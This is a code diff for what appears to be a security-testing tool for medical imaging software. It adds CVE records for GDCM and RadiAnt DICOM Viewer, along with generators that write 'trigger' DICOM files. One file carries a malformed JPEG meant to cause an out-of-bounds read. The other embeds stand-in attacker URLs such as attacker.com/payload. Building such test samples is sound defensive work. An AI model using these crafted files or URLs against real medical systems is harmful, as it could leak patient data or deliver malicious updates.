@@ -179,6 +179,34 @@ CVE_DATABASE: dict[str, CVEInfo] = {
             "https://www.redpacketsecurity.com/cve-alert-cve-2025-53618",
         ],
     ),
+    "CVE-2025-53619": CVEInfo(
+        cve_id="CVE-2025-53619",
+        product="Grassroots DICOM (GDCM)",
+        vulnerability_type="Information disclosure (JPEG codec)",
+        cvss=7.5,
+        year=2025,
+        description="OOB read causing information leak in JPEG codec",
+        affected_versions="< 3.0.24",
+        fixed_version="3.0.24",
+        references=[
+            "https://www.redpacketsecurity.com/cve-alert-cve-2025-53619",
+            "https://bitninja.com/blog/critical-server-security-alert-cve-2025-53619/",
+        ],
+    ),
+    "CVE-2025-1001": CVEInfo(
+        cve_id="CVE-2025-1001",
+        product="Medixant RadiAnt DICOM Viewer",
+        vulnerability_type="Certificate validation bypass (MitM)",
+        cvss=5.7,
+        year=2025,
+        description="Update mechanism fails to verify server certificate, enabling MitM attacks",
+        affected_versions="< 2025.1",
+        fixed_version="2025.1",
+        references=[
+            "https://socprime.com/blog/cve-2025-1001-medixant-radiant-dicom-viewer-vulnerability/",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-1001",
+        ],
+    ),
 }
 
 
@@ -544,6 +572,93 @@ class CVESampleGenerator:
         ds.save_as(output_path, write_like_original=False)
         return output_path
 
+    def generate_cve_2025_53619(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2025-53619 (GDCM JPEG codec info leak).
+
+        Creates DICOM with malformed JPEG data causing information disclosure.
+        """
+        if output_path is None:
+            output_path = self.output_dir / "cve_2025_53619" / "trigger.dcm"
+
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        ds = self.create_base_dicom()
+        ds.PatientName = "CVE-2025-53619^JPEG_INFO_LEAK"
+
+        # Use JPEG transfer syntax
+        ds.file_meta.TransferSyntaxUID = JPEGLosslessSV1
+
+        ds.Rows = 16
+        ds.Columns = 16
+        ds.BitsAllocated = 8
+        ds.BitsStored = 8
+        ds.HighBit = 7
+
+        # Malformed JPEG with invalid quantization table
+        # Could cause reading beyond buffer bounds
+        malformed_jpeg = bytes(
+            [
+                0xFF,
+                0xD8,  # SOI
+                0xFF,
+                0xDB,  # DQT marker
+                0x00,
+                0x43,  # Length (67 bytes declared)
+                0x00,  # Table ID
+            ]
+            + [0x10] * 64  # Quantization values
+            + [
+                0xFF,
+                0xC0,  # SOF0
+                0x00,
+                0x0B,  # Length
+                0x08,  # Precision
+                0x00,
+                0x10,  # Height
+                0x00,
+                0x10,  # Width
+                0x01,  # Components
+                0x01,
+                0x11,
+                0x00,  # Component spec
+                0xFF,
+                0xD9,  # EOI
+            ]
+        )
+
+        ds.PixelData = encapsulate([malformed_jpeg])
+
+        ds.save_as(output_path, write_like_original=False)
+        return output_path
+
+    def generate_cve_2025_1001(self, output_path: Path | None = None) -> Path:
+        """Generate sample for CVE-2025-1001 (RadiAnt MitM).
+
+        Creates DICOM with metadata simulating MitM attack vectors.
+        Note: This CVE is about update mechanism, not file format.
+        This sample contains metadata relevant to network-based attacks.
+        """
+        if output_path is None:
+            output_path = self.output_dir / "cve_2025_1001" / "trigger.dcm"
+
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        ds = self.create_base_dicom()
+        ds.PatientName = "CVE-2025-1001^MITM_UPDATE"
+
+        # Network-related metadata that could be exploited
+        ds.RetrieveURL = "http://malicious-server.example.com/update.exe"
+        ds.StationName = "RADIANT-MITM-TEST"
+
+        # Add fields that might be used in update/download operations
+        ds.add_new(0x00091001, "LO", "http://attacker.com/payload")
+        ds.add_new(
+            0x00091002, "LT", "https://legitimate-looking-domain.com/RadiAnt_Update.msi"
+        )
+
+        ds.save_as(output_path, write_like_original=False)
+        return output_path
+
     def generate_all(self) -> dict[str, Path | None]:
         """Generate all CVE samples."""
         results: dict[str, Path | None] = {}
@@ -556,9 +671,11 @@ class CVESampleGenerator:
             "CVE-2024-22100": self.generate_cve_2024_22100,
             "CVE-2024-28877": self.generate_cve_2024_28877,
             "CVE-2024-33606": self.generate_cve_2024_33606,
+            "CVE-2025-1001": self.generate_cve_2025_1001,
             "CVE-2025-5943": self.generate_cve_2025_5943,
             "CVE-2025-11266": self.generate_cve_2025_11266,
             "CVE-2025-53618": self.generate_cve_2025_53618,
+            "CVE-2025-53619": self.generate_cve_2025_53619,
         }
 
         for cve_id, generator in generators.items():
